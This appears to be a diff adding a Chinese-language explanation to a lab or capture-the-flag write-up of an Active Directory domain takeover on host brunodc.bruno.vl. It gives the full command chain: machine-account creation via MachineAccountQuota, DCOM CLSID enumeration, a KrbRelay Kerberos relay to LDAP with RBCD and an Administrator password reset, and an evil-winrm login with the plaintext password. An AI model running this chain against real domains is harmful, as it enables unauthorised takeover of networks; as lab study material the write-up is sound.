@@ -120,6 +120,53 @@ PS C:\ProgramData> ./KrbRelay.exe -spn ldap/brunodc.bruno.vl -clsid d99e6e74-fc8
 ————————————————————————————————————————————————————
 [★]$ evil-winrm -i brunodc.bruno.vl -u 'administrator' -p 'Lacure77#'
 ————————————————————————————————————————————————————
+解析
+一个典型的 AD 提权链（MAQ + COM → Kerberos Relay → RBCD → 接管 Administrator）
+
+利用 MachineAccountQuota + DCOM + Kerberos Relay
+给自己机器加 RBCD 权限
+最后 重置 Administrator 密码登录域控
+
+Step 1：创建机器账户（MAQ 利用）
+./Sharpmad.exe MAQ -Action new -MachineAccount roguecomputer -MachinePassword xiaohei
+Step 2：找可用端口（用于 COM Relay） //到一个端口（10246），该端口允许 SYSTEM → 你监听的服务通信
+./CheckPort.exe
+Step 3：获取你机器账户的 SID
+[System.Security.Principal.SecurityIdentifier]::new((([ADSI]"LDAP://CN=roguecomputer,CN=Computers,DC=bruno,DC=vl").objectSID).Value,0).Value
+Step 4：枚举可利用 CLSID（DCOM 攻击面）
+./GetCLSID.ps1
+Import-Csv Windows_Server_2022_Datacenter\CLSIDs.csv | ForEach-Object { $entry = $_; try { $svc = Get-Service $entry.LocalService -ErrorAction Stop; if ($svc.Status -eq "Running") { try { [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($entry.CLSID.Trim("{}")))|Out-Null; "$($entry.LocalService) | $($entry.CLSID) | Activate OK" } catch { if ($_.Exception.Message -match "80070005") { $r = "Access Denied" } elseif ($_.Exception.Message -match "80040111") { $r = "Class Not Available" } elseif ($_.Exception.Message -match "80070422") { $r = "Service Disabled" } else { $r = "Failed" }; "$($entry.LocalService) | $($entry.CLSID) | $r" } } } catch {} }
+关键点：CertSvc -> Certificate Service（证书服务）->可以被 SYSTEM 调用,支持 DCOM 激活 -> 且：Activate OK
+Step 5：核心攻击（KrbRelay）
+./KrbRelay.exe \
+-spn ldap/brunodc.bruno.vl \
+-clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 \
+-rbcd S-1-5-21-...-5101 \
+-ssl \
+-port 10246 \
+-reset-password administrator Lacure77#
+
+[普通用户]
+    ↓
+(MAQ)
+    ↓
+创建机器账户 roguecomputer$
+    ↓
+(DCOM)
+    ↓
+诱导 SYSTEM 认证
+    ↓
+(Kerberos Relay)
+    ↓
+转发到 LDAP
+    ↓
+(RBCD)
+    ↓
+赋权 roguecomputer$
+    ↓
+接管 Administrator
+    ↓
+WinRM 登录
 ```
 
 </details>
